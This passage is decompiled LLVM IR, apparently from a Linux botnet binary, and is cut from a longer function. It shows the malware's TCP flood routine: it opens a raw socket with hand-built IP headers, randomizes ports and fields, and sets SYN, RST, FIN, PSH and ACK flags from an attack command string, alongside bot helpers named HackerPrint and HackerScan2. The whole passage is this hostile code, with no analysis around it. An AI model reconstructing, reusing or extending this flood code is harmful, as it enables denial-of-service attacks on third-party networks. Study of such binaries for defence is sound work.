  %v1_804f094 = icmp eq i32 %v5_804f08f, 0
  br i1 %v1_804f094, label %dec_label_pc_804f09d, label %dec_label_pc_804f5f6

dec_label_pc_804f09d:                             ; preds = %dec_label_pc_804f07f
  %v5_804f0a0 = icmp ugt i32* %stack_var_-60, inttoptr (i32 -9 to i32*)
  store i1 %v5_804f0a0, i1* %cf.global-to-local, align 1
  %v15_804f0a0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804f0a0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i8* inttoptr (i32 2 to i8*), i8** %stack_var_-188, align 4
  %v5_804f0c7 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v5_804f0c7, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f0cf = icmp eq i32 %v5_804f0c7, 0
  %v1_804f0d3 = icmp eq i1 %v4_804f0cf, false
  br i1 %v1_804f0d3, label %dec_label_pc_804f0ef, label %dec_label_pc_804f0d5

dec_label_pc_804f0d5:                             ; preds = %dec_label_pc_804f09d
  %v0_804f0d5 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_804f0d5 = ptrtoint i8* %v0_804f0d5 to i32
  store i32 %v1_804f0d5, i32* %eax.global-to-local, align 4
  store i8* %v0_804f0d5, i8** %stack_var_-188, align 4
  %v4_804f0e5 = call i32 @HackerPrint(i32 %v1_804f0d5, i32 ptrtoint ([27 x i8]* @global_var_805b8d0.419 to i32))
  store i32 %v4_804f0e5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f5f6

dec_label_pc_804f0ef:                             ; preds = %dec_label_pc_804f09d
  store i32 1, i32* %stack_var_-64, align 4
  %v2_804f0fe = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v5_804f0c7, i32* %eax.global-to-local, align 4
  %v4_804f118 = inttoptr i32 %v5_804f0c7 to i8*
  store i8* %v4_804f118, i8** %stack_var_-188, align 4
  %v7_804f11b = call i32 @__GI_setsockopt(i32 %v5_804f0c7, i32 0, i32 3, i32 %v2_804f0fe, i32 4)
  store i32 %v7_804f11b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804f120 = icmp slt i32 %v7_804f11b, 0
  %v1_804f122 = icmp eq i1 %v2_804f120, false
  br i1 %v1_804f122, label %dec_label_pc_804f13e, label %dec_label_pc_804f124

dec_label_pc_804f124:                             ; preds = %dec_label_pc_804f0ef
  %v0_804f124 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_804f124 = ptrtoint i8* %v0_804f124 to i32
  store i32 %v1_804f124, i32* %eax.global-to-local, align 4
  store i8* %v0_804f124, i8** %stack_var_-188, align 4
  %v4_804f134 = call i32 @HackerPrint(i32 %v1_804f124, i32 ptrtoint ([33 x i8]* @global_var_805b8ec.420 to i32))
  store i32 %v4_804f134, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f5f6

dec_label_pc_804f13e:                             ; preds = %dec_label_pc_804f0ef
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f13e = icmp eq i32 %arg4, 0
  %v1_804f142 = icmp eq i1 %v4_804f13e, false
  br i1 %v1_804f142, label %dec_label_pc_804f14d, label %dec_label_pc_804f163

dec_label_pc_804f14d:                             ; preds = %dec_label_pc_804f13e
  %v5_804f154 = sub i32 32, %arg4
  %v10_804f154 = icmp ugt i32 %arg4, 32
  store i1 %v10_804f154, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804f15c = urem i32 %v5_804f154, 32
  %v4_804f15c = icmp eq i32 %v2_804f15c, 0
  br i1 %v4_804f15c, label %bb90, label %bb

bb:                                               ; preds = %dec_label_pc_804f14d
  %v5_804f15c = shl i32 1, %v2_804f15c
  store i32 %v5_804f15c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb90

bb90:                                             ; preds = %dec_label_pc_804f14d, %bb
  %v0_804f15e = phi i32 [ 1, %dec_label_pc_804f14d ], [ %v5_804f15c, %bb ]
  %v1_804f15e = sub i32 0, %v0_804f15e
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804f15e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f163

dec_label_pc_804f163:                             ; preds = %dec_label_pc_804f13e, %bb90
  %storemerge10 = phi i32 [ %v1_804f15e, %bb90 ], [ 0, %dec_label_pc_804f13e ]
  %v1_804f166 = add i32 %arg6, 40
  %v1_804f172 = add i32 %arg6, 70
  %v2_804f175 = and i32 %v1_804f172, -16
  %v0_804f17b = load i32, i32* @esp, align 4
  %v2_804f17b = sub i32 %v0_804f17b, %v2_804f175
  %v1_804f17d = add i32 %v2_804f17b, 24
  store i32 %v1_804f17d, i32* %edx.global-to-local, align 4
  %v1_804f187 = add i32 %v2_804f17b, 39
  %v2_804f18a = and i32 %v1_804f187, -16
  %v1_804f1a2 = add i32 %v2_804f18a, 20
  %v5_804f1a5 = inttoptr i32 %v1_804f1a2 to i16*
  %v1_804f1ab = add i32 %arg6, 20
  %v5_804f1ab = icmp ugt i32 %arg6, -21
  store i1 %v5_804f1ab, i1* %cf.global-to-local, align 1
  store i32 %v1_804f1ab, i32* @ebx, align 4
  store i32 %storemerge10, i32* @eax, align 4
  %v2_804f1b3 = inttoptr i32 %v2_804f17b to i32*
  store i32 %storemerge10, i32* %v2_804f1b3, align 4
  %v1_804f1b6 = call i32 @HackerScan2(i32 %v1_804f166)
  store i32 %v1_804f1b6, i32* %eax.global-to-local, align 4
  %v1_804f1bb = load i32, i32* @esp, align 4
  %v2_804f1bb = inttoptr i32 %v1_804f1bb to i32*
  store i32 %v1_804f1b6, i32* %v2_804f1bb, align 4
  %v0_804f1be = call i32 @htonl()
  %v3_804f1c3 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804f1c3, i32* %edx.global-to-local, align 4
  %v0_804f1c6 = load i32, i32* @ebx, align 4
  %v1_804f1c6 = load i32, i32* @esp, align 4
  %v2_804f1c6 = add i32 %v1_804f1c6, 16
  %v3_804f1c6 = inttoptr i32 %v2_804f1c6 to i32*
  store i32 %v0_804f1c6, i32* %v3_804f1c6, align 4
  %v0_804f1ca = load i32, i32* @esp, align 4
  %v1_804f1ca = add i32 %v0_804f1ca, 12
  %v2_804f1ca = inttoptr i32 %v1_804f1ca to i32*
  store i32 6, i32* %v2_804f1ca, align 4
  %v1_804f1d2 = load i32, i32* @esp, align 4
  %v2_804f1d2 = add i32 %v1_804f1d2, 8
  %v3_804f1d2 = inttoptr i32 %v2_804f1d2 to i32*
  store i32 %v0_804f1be, i32* %v3_804f1d2, align 4
  %v0_804f1d6 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f1d6 = load i32, i32* @esp, align 4
  %v2_804f1d6 = add i32 %v1_804f1d6, 4
  %v3_804f1d6 = inttoptr i32 %v2_804f1d6 to i32*
  store i32 %v0_804f1d6, i32* %v3_804f1d6, align 4
  store i32 %v2_804f18a, i32* %eax.global-to-local, align 4
  %v1_804f1dd = load i32, i32* @esp, align 4
  %v2_804f1dd = inttoptr i32 %v1_804f1dd to i32*
  store i32 %v2_804f18a, i32* %v2_804f1dd, align 4
  %v0_804f1e0 = call i32 @makeIPPacket()
  store i32 %v0_804f1e0, i32* %eax.global-to-local, align 4
  %v2_804f1e5 = call i32 @rand_cmwc(i32 %v1_804f1a2)
  %v1_804f1ea = urem i32 %v2_804f1e5, 65536
  store i32 %v1_804f1ea, i32* %edx.global-to-local, align 4
  store i32 %v1_804f1a2, i32* %eax.global-to-local, align 4
  %v1_804f1f0 = trunc i32 %v2_804f1e5 to i16
  store i16 %v1_804f1f0, i16* %v5_804f1a5, align 4
  %v2_804f1f3 = call i32 @rand_cmwc(i32 %v1_804f1a2)
  %v2_804f1fd = add i32 %v2_804f18a, 24
  %v3_804f1fd = inttoptr i32 %v2_804f1fd to i32*
  store i32 %v2_804f1f3, i32* %v3_804f1fd, align 8
  store i32 %v1_804f1a2, i32* %eax.global-to-local, align 4
  %v1_804f203 = add i32 %v2_804f18a, 28
  %v2_804f203 = inttoptr i32 %v1_804f203 to i32*
  store i32 0, i32* %v2_804f203, align 4
  store i32 %v1_804f1a2, i32* %edx.global-to-local, align 4
  %v1_804f20d = add i32 %v2_804f18a, 32
  %v2_804f20d = inttoptr i32 %v1_804f20d to i8*
  %v3_804f20d = load i8, i8* %v2_804f20d, align 16
  %v2_804f211 = urem i8 %v3_804f20d, 16
  %v2_804f213 = or i8 %v2_804f211, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v2_804f213, i8* %v2_804f20d, align 16
  %v4_804f218 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804f218, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f218, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805b90d.421 to i32), i32* @edi, align 4
  %v7_804f236 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b90d.421, i32 0, i32 0), i32 4)
  %v8_804f236 = urem i32 %v7_804f236, 2
  %v9_804f236 = icmp eq i32 %v8_804f236, 0
  %v0_804f238 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f238 = or i1 %v0_804f238, %v9_804f236
  %v3_804f238 = zext i1 %v2_804f238 to i32
  %v4_804f238 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f238 = and i32 %v4_804f238, -256
  %v6_804f238 = or i32 %v3_804f238, %v5_804f238
  %v7_804f238 = xor i32 %v6_804f238, 1
  store i32 %v7_804f238, i32* @edx, align 4
  %v3_804f23e = and i32 %v7_804f236, -256
  %v1_804f240 = trunc i32 %v7_804f238 to i8
  %v3_804f240 = zext i1 %v0_804f238 to i8
  %v4_804f240 = sub nsw i8 %v1_804f240, %v3_804f240
  %v15_804f240 = icmp eq i8 %v4_804f240, 0
  %v20_804f240 = zext i8 %v4_804f240 to i32
  %v23_804f240 = or i32 %v20_804f240, %v3_804f23e
  store i32 %v23_804f240, i32* @ecx, align 4
  %v2_804f244 = sext i8 %v4_804f240 to i32
  store i32 %v2_804f244, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f249 = icmp eq i1 %v15_804f240, false
  br i1 %v1_804f249, label %dec_label_pc_804f28c, label %dec_label_pc_804f24b

dec_label_pc_804f24b:                             ; preds = %dec_label_pc_804f163
  store i32 %v1_804f1a2, i32* %edx.global-to-local, align 4
  %v1_804f24e = add i32 %v2_804f18a, 33
  %v2_804f24e = inttoptr i32 %v1_804f24e to i8*
  %v3_804f24e = load i8, i8* %v2_804f24e, align 1
  %v2_804f252 = or i8 %v3_804f24e, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f252 = zext i8 %v2_804f252 to i32
  store i32 %v7_804f252, i32* %eax.global-to-local, align 4
  store i8 %v2_804f252, i8* %v2_804f24e, align 1
  store i32 %v1_804f1a2, i32* %edx.global-to-local, align 4
  %v3_804f25a = load i8, i8* %v2_804f24e, align 1
  %v2_804f25e = or i8 %v3_804f25a, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f25e = zext i8 %v2_804f25e to i32
  store i32 %v7_804f25e, i32* %eax.global-to-local, align 4
  store i8 %v2_804f25e, i8* %v2_804f24e, align 1
  store i32 %v1_804f1a2, i32* %edx.global-to-local, align 4
  %v3_804f266 = load i8, i8* %v2_804f24e, align 1
  %v2_804f26a = or i8 %v3_804f266, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f26a = zext i8 %v2_804f26a to i32
  store i32 %v7_804f26a, i32* %eax.global-to-local, align 4
  store i8 %v2_804f26a, i8* %v2_804f24e, align 1
  store i32 %v1_804f1a2, i32* %edx.global-to-local, align 4
  %v3_804f272 = load i8, i8* %v2_804f24e, align 1
  %v2_804f276 = or i8 %v3_804f272, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f276 = zext i8 %v2_804f276 to i32
  store i32 %v7_804f276, i32* %eax.global-to-local, align 4
  store i8 %v2_804f276, i8* %v2_804f24e, align 1
  store i32 %v1_804f1a2, i32* %edx.global-to-local, align 4
  %v3_804f27e = load i8, i8* %v2_804f24e, align 1
  %v2_804f282 = or i8 %v3_804f27e, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f282 = zext i8 %v2_804f282 to i32
  store i32 %v7_804f282, i32* %eax.global-to-local, align 4
  store i8 %v2_804f282, i8* %v2_804f24e, align 1
  %v0_804f462.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804f462

dec_label_pc_804f28c:                             ; preds = %dec_label_pc_804f163
  store i32 %v4_804f218, i32* @eax, align 4
  %v0_804f28f = load i32, i32* @esp, align 4
  %v1_804f28f = add i32 %v0_804f28f, 4
  %v2_804f28f = inttoptr i32 %v1_804f28f to i32*
  store i32 ptrtoint (i32* @global_var_805b911.422 to i32), i32* %v2_804f28f, align 4
  %v0_804f297 = load i32, i32* @eax, align 4
  %v1_804f297 = load i32, i32* @esp, align 4
  %v2_804f297 = inttoptr i32 %v1_804f297 to i32*
  store i32 %v0_804f297, i32* %v2_804f297, align 4
  %v3_804f29a = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_805b90d.421 to i32))
  store i32 %v3_804f29a, i32* %eax.global-to-local, align 4
  %v5_804f29f = inttoptr i32 %v3_804f29a to i8*
  store i8* %v5_804f29f, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804f45817 = icmp eq i32 %v3_804f29a, 0
  %v1_804f45c24 = icmp eq i1 %v5_804f45817, false
  br i1 %v1_804f45c24, label %dec_label_pc_804f2a7.lr.ph, label %dec_label_pc_804f462

dec_label_pc_804f2a7.lr.ph:                       ; preds = %dec_label_pc_804f28c
  %v1_804f418 = add i32 %v2_804f18a, 33
  %v2_804f418 = inttoptr i32 %v1_804f418 to i8*
  %tmp91 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804f2a7

dec_label_pc_804f2a7:                             ; preds = %dec_label_pc_804f2a7.lr.ph, %dec_label_pc_804f441
  %v3_804f42a = phi i8* [ %v5_804f29f, %dec_label_pc_804f2a7.lr.ph ], [ %tmp92, %dec_label_pc_804f441 ]
  %stack_var_-160.126 = phi i32 [ %tmp40, %dec_label_pc_804f2a7.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804f441 ]
  %stack_var_-156.125 = phi i8* [ %tmp41, %dec_label_pc_804f2a7.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804f441 ]
  %v4_804f2a7 = ptrtoint i8* %v3_804f42a to i32
  store i32 %v4_804f2a7, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f2a7, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805b913.423 to i32), i32* @edi, align 4
  %v7_804f2c5 = call i32 @_strncmp(i8* %v3_804f42a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b913.423, i32 0, i32 0), i32 4)
  %v8_804f2c5 = urem i32 %v7_804f2c5, 2
  %v9_804f2c5 = icmp eq i32 %v8_804f2c5, 0
  %v0_804f2c7 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f2c7 = or i1 %v0_804f2c7, %v9_804f2c5
  %v3_804f2c7 = zext i1 %v2_804f2c7 to i32
  %v4_804f2c7 = load i32, i32* @edx, align 4
  %v5_804f2c7 = and i32 %v4_804f2c7, -256
  %v6_804f2c7 = or i32 %v3_804f2c7, %v5_804f2c7
  %v7_804f2c7 = xor i32 %v6_804f2c7, 1
  store i32 %v7_804f2c7, i32* %edx.global-to-local, align 4
  %v3_804f2cd = and i32 %v7_804f2c5, -256
  %v1_804f2cf = trunc i32 %v7_804f2c7 to i8
  %v3_804f2cf = zext i1 %v0_804f2c7 to i8
  %v4_804f2cf = sub nsw i8 %v1_804f2cf, %v3_804f2cf
  %v15_804f2cf = icmp eq i8 %v4_804f2cf, 0
  %v20_804f2cf = zext i8 %v4_804f2cf to i32
  %v23_804f2cf = or i32 %v20_804f2cf, %v3_804f2cd
  store i32 %v23_804f2cf, i32* @ecx, align 4
  %v2_804f2d3 = sext i8 %v4_804f2cf to i32
  store i32 %v2_804f2d3, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f2d8 = icmp eq i1 %v15_804f2cf, false
  br i1 %v1_804f2d8, label %dec_label_pc_804f2ec, label %dec_label_pc_804f2da

dec_label_pc_804f2da:                             ; preds = %dec_label_pc_804f2a7
  store i32 %v1_804f1a2, i32* @eax, align 4
  %v3_804f2dd = load i8, i8* %v2_804f418, align 1
  %v2_804f2e1 = or i8 %v3_804f2dd, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f2e1 = zext i8 %v2_804f2e1 to i32
  store i32 %v7_804f2e1, i32* @edx, align 4
  store i8 %v2_804f2e1, i8* %v2_804f418, align 1
  br label %dec_label_pc_804f441

dec_label_pc_804f2ec:                             ; preds = %dec_label_pc_804f2a7
  store i32 %v4_804f2a7, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f2a7, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805b917.424 to i32), i32* @edi, align 4
  %v7_804f30a = call i32 @_strncmp(i8* %v3_804f42a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b917.424, i32 0, i32 0), i32 4)
  %v8_804f30a = urem i32 %v7_804f30a, 2
  %v9_804f30a = icmp eq i32 %v8_804f30a, 0
  %v0_804f30c = load i1, i1* %cf.global-to-local, align 1
  %v2_804f30c = or i1 %v0_804f30c, %v9_804f30a
  %v3_804f30c = zext i1 %v2_804f30c to i32
  %v4_804f30c = load i32, i32* %edx.global-to-local, align 4
  %v5_804f30c = and i32 %v4_804f30c, -256
  %v6_804f30c = or i32 %v3_804f30c, %v5_804f30c
  %v7_804f30c = xor i32 %v6_804f30c, 1
  store i32 %v7_804f30c, i32* %edx.global-to-local, align 4
  %v3_804f312 = and i32 %v7_804f30a, -256
  %v1_804f314 = trunc i32 %v7_804f30c to i8
  %v3_804f314 = zext i1 %v0_804f30c to i8
  %v4_804f314 = sub nsw i8 %v1_804f314, %v3_804f314
  %v15_804f314 = icmp eq i8 %v4_804f314, 0
  %v20_804f314 = zext i8 %v4_804f314 to i32
  %v23_804f314 = or i32 %v20_804f314, %v3_804f312
  store i32 %v23_804f314, i32* @ecx, align 4
  %v2_804f318 = sext i8 %v4_804f314 to i32
  store i32 %v2_804f318, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f31d = icmp eq i1 %v15_804f314, false
  br i1 %v1_804f31d, label %dec_label_pc_804f331, label %dec_label_pc_804f31f

dec_label_pc_804f31f:                             ; preds = %dec_label_pc_804f2ec
  store i32 %v1_804f1a2, i32* @eax, align 4
  %v3_804f322 = load i8, i8* %v2_804f418, align 1
  %v2_804f326 = or i8 %v3_804f322, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f326 = zext i8 %v2_804f326 to i32
  store i32 %v7_804f326, i32* @edx, align 4
  store i8 %v2_804f326, i8* %v2_804f418, align 1
  br label %dec_label_pc_804f441

dec_label_pc_804f331:                             ; preds = %dec_label_pc_804f2ec
  store i32 %v4_804f2a7, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f2a7, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805b91b.425 to i32), i32* @edi, align 4
  %v7_804f355 = call i32 @_strncmp(i8* %v3_804f42a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b91b.425, i32 0, i32 0), i32 4)
  %v8_804f355 = urem i32 %v7_804f355, 2
  %v9_804f355 = icmp eq i32 %v8_804f355, 0
  %v0_804f357 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f357 = or i1 %v0_804f357, %v9_804f355
  %v3_804f357 = zext i1 %v2_804f357 to i32
  %v4_804f357 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f357 = and i32 %v4_804f357, -256
  %v6_804f357 = or i32 %v3_804f357, %v5_804f357
  %v7_804f357 = xor i32 %v6_804f357, 1
  store i32 %v7_804f357, i32* %edx.global-to-local, align 4
  %v3_804f35d = and i32 %v7_804f355, -256
  %v1_804f35f = trunc i32 %v7_804f357 to i8
  %v3_804f35f = zext i1 %v0_804f357 to i8
  %v4_804f35f = sub nsw i8 %v1_804f35f, %v3_804f35f
  %v15_804f35f = icmp eq i8 %v4_804f35f, 0
  %v20_804f35f = zext i8 %v4_804f35f to i32
  %v23_804f35f = or i32 %v20_804f35f, %v3_804f35d
  store i32 %v23_804f35f, i32* @ecx, align 4
  %v2_804f363 = sext i8 %v4_804f35f to i32
  store i32 %v2_804f363, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f368 = icmp eq i1 %v15_804f35f, false
  br i1 %v1_804f368, label %dec_label_pc_804f37c, label %dec_label_pc_804f36a

dec_label_pc_804f36a:                             ; preds = %dec_label_pc_804f331
  store i32 %v1_804f1a2, i32* @eax, align 4
  %v3_804f36d = load i8, i8* %v2_804f418, align 1
  %v2_804f371 = or i8 %v3_804f36d, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f371 = zext i8 %v2_804f371 to i32
  store i32 %v7_804f371, i32* @edx, align 4
  store i8 %v2_804f371, i8* %v2_804f418, align 1
  br label %dec_label_pc_804f441

dec_label_pc_804f37c:                             ; preds = %dec_label_pc_804f331
  store i32 %v4_804f2a7, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f2a7, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805b91f.426 to i32), i32* @edi, align 4
  %v7_804f3ac = call i32 @_strncmp(i8* %v3_804f42a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b91f.426, i32 0, i32 0), i32 4)
  %v8_804f3ac = urem i32 %v7_804f3ac, 2
  %v9_804f3ac = icmp eq i32 %v8_804f3ac, 0
  %v0_804f3ae = load i1, i1* %cf.global-to-local, align 1
  %v2_804f3ae = or i1 %v0_804f3ae, %v9_804f3ac
  %v3_804f3ae = zext i1 %v2_804f3ae to i32
  %v4_804f3ae = load i32, i32* %edx.global-to-local, align 4
  %v5_804f3ae = and i32 %v4_804f3ae, -256
  %v6_804f3ae = or i32 %v3_804f3ae, %v5_804f3ae
  %v7_804f3ae = xor i32 %v6_804f3ae, 1
  store i32 %v7_804f3ae, i32* %edx.global-to-local, align 4
  %v3_804f3b4 = and i32 %v7_804f3ac, -256
  %v1_804f3b6 = trunc i32 %v7_804f3ae to i8
  %v3_804f3b6 = zext i1 %v0_804f3ae to i8
  %v4_804f3b6 = sub nsw i8 %v1_804f3b6, %v3_804f3b6
  %v15_804f3b6 = icmp eq i8 %v4_804f3b6, 0
  %v20_804f3b6 = zext i8 %v4_804f3b6 to i32
  %v23_804f3b6 = or i32 %v20_804f3b6, %v3_804f3b4
  store i32 %v23_804f3b6, i32* @ecx, align 4
  %v2_804f3ba = sext i8 %v4_804f3b6 to i32
  store i32 %v2_804f3ba, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f3bf = icmp eq i1 %v15_804f3b6, false
  br i1 %v1_804f3bf, label %dec_label_pc_804f3d0, label %dec_label_pc_804f3c1

dec_label_pc_804f3c1:                             ; preds = %dec_label_pc_804f37c
  store i32 %v1_804f1a2, i32* @eax, align 4
  %v3_804f3c4 = load i8, i8* %v2_804f418, align 1
  %v2_804f3c8 = or i8 %v3_804f3c4, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f3c8 = zext i8 %v2_804f3c8 to i32
  store i32 %v7_804f3c8, i32* @edx, align 4
  store i8 %v2_804f3c8, i8* %v2_804f418, align 1
  br label %dec_label_pc_804f441

dec_label_pc_804f3d0:                             ; preds = %dec_label_pc_804f37c
  store i32 %v4_804f2a7, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804f2a7, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805b923.427 to i32), i32* @edi, align 4
  %v7_804f400 = call i32 @_strncmp(i8* %v3_804f42a, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b923.427, i32 0, i32 0), i32 4)
  %v8_804f400 = urem i32 %v7_804f400, 2
  %v9_804f400 = icmp eq i32 %v8_804f400, 0
  %v0_804f402 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f402 = or i1 %v0_804f402, %v9_804f400
  %v3_804f402 = zext i1 %v2_804f402 to i32
  %v4_804f402 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f402 = and i32 %v4_804f402, -256
  %v6_804f402 = or i32 %v3_804f402, %v5_804f402
  %v7_804f402 = xor i32 %v6_804f402, 1
  store i32 %v7_804f402, i32* %edx.global-to-local, align 4
  %v3_804f408 = and i32 %v7_804f400, -256
  %v1_804f40a = trunc i32 %v7_804f402 to i8
  %v3_804f40a = zext i1 %v0_804f402 to i8
  %v4_804f40a = sub nsw i8 %v1_804f40a, %v3_804f40a
  %v15_804f40a = icmp eq i8 %v4_804f40a, 0
  %v20_804f40a = zext i8 %v4_804f40a to i32
  %v23_804f40a = or i32 %v20_804f40a, %v3_804f408
  store i32 %v23_804f40a, i32* @ecx, align 4
  %v2_804f40e = sext i8 %v4_804f40a to i32
  store i32 %v2_804f40e, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f413 = icmp eq i1 %v15_804f40a, false
  br i1 %v1_804f413, label %dec_label_pc_804f424, label %dec_label_pc_804f415

dec_label_pc_804f415:                             ; preds = %dec_label_pc_804f3d0
  store i32 %v1_804f1a2, i32* @eax, align 4
  %v3_804f418 = load i8, i8* %v2_804f418, align 1
  %v2_804f41c = or i8 %v3_804f418, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f41c = zext i8 %v2_804f41c to i32
  store i32 %v7_804f41c, i32* @edx, align 4
  store i8 %v2_804f41c, i8* %v2_804f418, align 1
  br label %dec_label_pc_804f441

dec_label_pc_804f424:                             ; preds = %dec_label_pc_804f3d0
  %v0_804f424 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_804f424 = ptrtoint i8* %v0_804f424 to i32
  store i32 %v1_804f424, i32* %edx.global-to-local, align 4
  store i32 %v4_804f2a7, i32* %eax.global-to-local, align 4
  %v1_804f42d = load i32, i32* @esp, align 4
  %v2_804f42d = add i32 %v1_804f42d, 8
  %v3_804f42d = inttoptr i32 %v2_804f42d to i32*
  store i32 %v4_804f2a7, i32* %v3_804f42d, align 4
  %v0_804f431 = load i32, i32* @esp, align 4
  %v1_804f431 = add i32 %v0_804f431, 4
  %v2_804f431 = inttoptr i32 %v1_804f431 to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_805b927.428 to i32), i32* %v2_804f431, align 4
  %v0_804f439 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f439 = load i32, i32* @esp, align 4
  %v2_804f439 = inttoptr i32 %v1_804f439 to i32*
  store i32 %v0_804f439, i32* %v2_804f439, align 4
  %v3_804f43c = call i32 @HackerPrint(i32 4, i32 ptrtoint ([4 x i8]* @global_var_805b923.427 to i32))
  store i32 %v3_804f43c, i32* @eax, align 4
  br label %dec_label_pc_804f441

dec_label_pc_804f441:                             ; preds = %dec_label_pc_804f415, %dec_label_pc_804f3c1, %dec_label_pc_804f36a, %dec_label_pc_804f31f, %dec_label_pc_804f2da, %dec_label_pc_804f424
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b923.427, i32 0, i32 0), %dec_label_pc_804f424 ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b923.427, i32 0, i32 0), %dec_label_pc_804f415 ], [ %stack_var_-156.125, %dec_label_pc_804f3c1 ], [ %stack_var_-156.125, %dec_label_pc_804f36a ], [ %stack_var_-156.125, %dec_label_pc_804f31f ], [ %stack_var_-156.125, %dec_label_pc_804f2da ]
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804f424 ], [ 4, %dec_label_pc_804f415 ], [ %stack_var_-160.126, %dec_label_pc_804f3c1 ], [ %stack_var_-160.126, %dec_label_pc_804f36a ], [ %stack_var_-160.126, %dec_label_pc_804f31f ], [ %stack_var_-160.126, %dec_label_pc_804f2da ]
  %v0_804f441 = load i32, i32* @esp, align 4
  %v1_804f441 = add i32 %v0_804f441, 4
  %v2_804f441 = inttoptr i32 %v1_804f441 to i32*
  store i32 ptrtoint (i32* @global_var_805b911.422 to i32), i32* %v2_804f441, align 4
  %v0_804f449 = load i32, i32* @esp, align 4
  %v1_804f449 = inttoptr i32 %v0_804f449 to i32*
  store i32 0, i32* %v1_804f449, align 4
  %v2_804f450 = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804f450 = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804f450)
  store i32 %v3_804f450, i32* %eax.global-to-local, align 4
  store i32 %v3_804f450, i32* %tmp91, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804f458 = icmp eq i32 %v3_804f450, 0
  %v1_804f45c = icmp eq i1 %v5_804f458, false
  %tmp92 = inttoptr i32 %v3_804f450 to i8*
  br i1 %v1_804f45c, label %dec_label_pc_804f2a7, label %dec_label_pc_804f462

